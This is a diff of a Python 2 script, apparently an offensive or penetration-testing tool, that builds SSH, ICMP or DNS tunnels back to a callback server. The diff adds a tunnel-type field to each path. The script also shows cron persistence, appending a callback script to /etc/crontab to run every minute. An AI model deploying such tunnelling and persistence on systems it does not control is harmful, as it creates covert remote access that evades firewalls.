@@ -173,7 +173,7 @@ def callback():
                     if plugin.CallBack.checkTunnel(callbackIP,callbackPort):
                         print G+"[+] SSH is Open"+W
                         successMessage(callbackIP,callbackPort)
-                        return callbackIP,callbackPort
+                        return callbackIP,callbackPort,'Open Port'
                         status = True
                     else:
                         print R+"\n[x] Port %s open on IP %s but unable to connect via SSH" %(callbackPort,callbackIP,)+W
@@ -201,7 +201,7 @@ def callback():
                         print G+"[+] ICMP Tunnel Created!"+W
                         print B+"[-] An ICMP Tunnel is not as fast as a TCP Tunnel"+W
                         successMessage("10.0.0.1",22)
-                        return "10.0.0.1",'22'
+                        return "10.0.0.1",'22','ICMP'
                         status = True
                     else:
                         print R+"[x] ICMP Enabled but unable to create ICMP Tunnel"+W
@@ -222,7 +222,7 @@ def callback():
             #    print G+"[+] DNS Queries are allowed"+W
             if dnsTunnel(dnsPassword,nameserver,verbose,):
                 successMessage('192.168.128.1',22)
-                return '192.168.128.1','22'
+                return '192.168.128.1','22','DNS'
                 status = True
             else:
                 print R+"\n[x] Can't attempt DNS Tunnel, DNS is disabled or DNS blocked on the server %s \n" %(nameserver,)+W
@@ -260,6 +260,7 @@ def main():
         callbackPort=22
         tunnelIP=callbackIP
         tunnelPort=callbackPort
+        tunnelType='Open Port'
         if openPort(callbackPort,callbackIP) and checkTunnel(callbackIP,callbackPort):
             # Quick check for 22
             successMessage(callbackIP,callbackPort)
@@ -268,7 +269,7 @@ def main():
 
             # Try incase the nothing returned as there is no possible tunnel
             try:
-                tunnelIP,tunnelPort=callback()
+                tunnelIP,tunnelPort,tunnelType=callback()
             except:
                 print R+'[!] Tunnel not possible, as no posible tunnels to the callback server could be found\n'+W
                 tunnel = False
@@ -282,6 +283,7 @@ def main():
             replaceText(checkSSHLOC,'SET_IP',tunnelIP)
             replaceText(checkSSHLOC,'SET_PORT',tunnelPort)
             replaceText(checkSSHLOC,'SET_USER',sshuser)
+            replaceText(checkSSHLOC,'TUNNEL_TYPE',tunnelType)
             if checkSSHLOC not in open('/etc/crontab').read():
                 with open('/etc/crontab', "a") as file:
                     print G+"[+] Added SSH to try every minute in /etc/crontab"+W
